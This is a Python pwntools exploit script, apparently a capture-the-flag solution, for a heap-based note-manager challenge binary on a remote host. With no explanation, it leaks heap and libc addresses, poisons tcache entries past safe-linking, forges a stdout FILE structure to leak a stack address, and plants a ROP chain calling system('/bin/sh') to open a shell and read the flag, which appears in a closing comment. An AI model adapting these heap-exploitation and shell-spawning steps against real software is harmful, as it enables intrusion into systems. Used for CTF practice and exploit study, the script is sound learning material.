from pwn import *

exe = ELF("./pwn4_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

'''
'''

script = '''
'''

def create(index, size, note):
    p.sendafter(b"choice: ", b"0")
    p.sendafter(b"Index :", f"{index}".encode())
    p.sendafter(b"Size :", f"{size}".encode())
    p.sendafter(b"note :", note)

def view(index):
    p.sendafter(b"choice: ", b"1")
    p.sendafter(b"Index :", f"{index}".encode())

def delete(index):
    p.sendafter(b"choice: ", b"2")
    p.sendafter(b"Index :", f"{index}".encode())

def send(size, data, number):
    p.sendafter(b"choice: ", b"3")
    p.sendafter(b"Size: ", f"{size}".encode())
    p.sendafter(b"Data: ", data)
    p.sendlineafter(b"mode: ", number)

p = remote("10.8.0.1", 5003)
#p = process("./pwn4_patched")
#p = gdb.debug("./pwn4_patched", gdbscript = script)

for i in range(3):
    create(i, 0x10, b"A" * 8)
create(3, 0x10, p64(0) + p64(0x71))
for i in range(4, 8):
    create(i, 0x10, b"A" * 8)
send(0x307b20 - 0x10, b"A", b"2")
create(8, 0x20, p64(0) + p64(0x21))
create(9, 0x10, b"C" * 8)

for i in range(8):
    if(i != 5):
        delete(i)
delete(5)
view(9)
p.recvuntil(b"Note: ")
heap_base = u64(p.recv(5).ljust(8, b"\x00")) << 12
print(hex(heap_base))

for i in range(7, -1, -1):
    if(i == 3):
        create(i, 0x10, b"A" * 8 + p64(0x81))
    elif(i != 5):
        create(i, 0x10, b"A" * 8)
create(5, 0x10, b"A" * 8)

delete(8)
create(8, 0x70, b"A" * 0x8 + p64(0x21) + b"A" * 8 + p64(0) * 2 + p64(0x421) + b"A" * 8 + p64(0) * 2 + p64(0x0000000000020c71))

delete(0)
delete(1)
create(0, 0x3f0, b"B" * 8)
create(1, 0x20, b"C" * 8)
delete(5)
view(9)
p.recvuntil(b"Note: ")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x203b20
print(hex(libc_base))

create(5, 0x410, b"A" * 8)
delete(4)
create(4, 0x10, b"A" * 8 + p64(0x81))
delete(8)
create(8, 0x70, b"A" * 0x8 + p64(0x91) + b"A" * 8 + p64(0) * 2 + p64(0x91) + b"A" * 8 + p64(0) * 2 + p64(0x91) + b"A" * 8 + p64(0) * 2 + p64(0x91))
for i in range(7, 3, -1):
    delete(i)

delete(8)
fw1 = (heap_base + 0x340) ^ heap_base >> 12
fw2 = (heap_base + 0x360) ^ heap_base >> 12
stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
fw3 = (stdout) ^ heap_base >> 12
create(8, 0x70, b"A" * 0x8 + p64(0x91) + p64(fw1) + p64(0) * 2 + p64(0x91) + p64(fw2) + p64(0) * 2 + p64(0x91) + p64(fw3) + p64(0) * 2 + p64(0x91))
for i in range(4, 7):
    create(i, 0x80, b"A" * 8)

__environ = libc_base + libc.symbols['__environ']  
fakestdout = p64(0x00000000fbad2887) # flag
fakestdout += p64(0) # read_ptr
fakestdout += p64(__environ) # read_end
fakestdout += p64(0) # read_base
fakestdout += p64(__environ) # write_base
fakestdout += p64(__environ + 0x100) # write_ptr
fakestdout += p64(0) # write_end
fakestdout += p64(0) # buf_base
fakestdout += p64(0x100) # buf_end
create(7, 0x80, fakestdout)
rbp = u64(p.recv(6).ljust(8, b"\x00")) - 0x148
print(hex(rbp))

for i in range(6, 3, -1):
    delete(i)
delete(8)
fw1 = (heap_base + 0x340) ^ heap_base >> 12
fw2 = (rbp) ^ heap_base >> 12
create(8, 0x70, b"A" * 0x8 + p64(0x91) + p64(fw1) + p64(0) * 2 + p64(0x91) + p64(fw2) + p64(0) * 2 + p64(0x91) + p64(fw3) + p64(0) * 2 + p64(0x91))
for i in range(4, 6):
    create(i, 0x80, b"A" * 8)
pop_rdi = libc_base + 0x000000000010f75b
ret = pop_rdi + 1
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
create(6, 0x80, p64(0) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))

p.sendline(b"cat flag.txt")

p.interactive()
#BKSEC{d3f1n1t3ly_n0t_f0rm4t_5tr1ng_9jk6yc3cn2qhzjdwsohrhjy8klaakk5q}